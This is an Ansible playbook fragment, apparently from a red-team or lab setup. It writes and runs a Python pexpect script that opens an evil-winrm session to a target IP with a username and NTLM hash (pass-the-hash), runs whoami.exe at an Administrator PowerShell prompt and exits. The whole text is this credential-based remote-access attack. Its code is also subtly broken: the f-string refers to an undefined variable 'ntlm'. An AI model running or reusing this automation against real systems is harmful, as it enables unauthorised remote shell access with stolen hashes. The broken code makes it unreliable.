---
- name: Create evil-winrm send whomai command
  copy:
    dest: /opt/winrm.py
    content: |
      import pexpect

      target_ip = "{{ target_ip }}"
      username = "{{ username }}"
      password = "{{ ntlm }}"

      command = f"evil-winrm -i {target_ip} -u {username} -H {ntlm}"

      child = pexpect.spawn(command)
      child.timeout = None
      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
      child.sendline("whoami.exe")
      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
      child.sendline("exit")
      child.interact()

- name: Make thescript executable
  file:
    path: /opt/winrm.py
    mode: '0755'

- name: Run the evil-winrm
  shell: python3 /opt/winrm.py
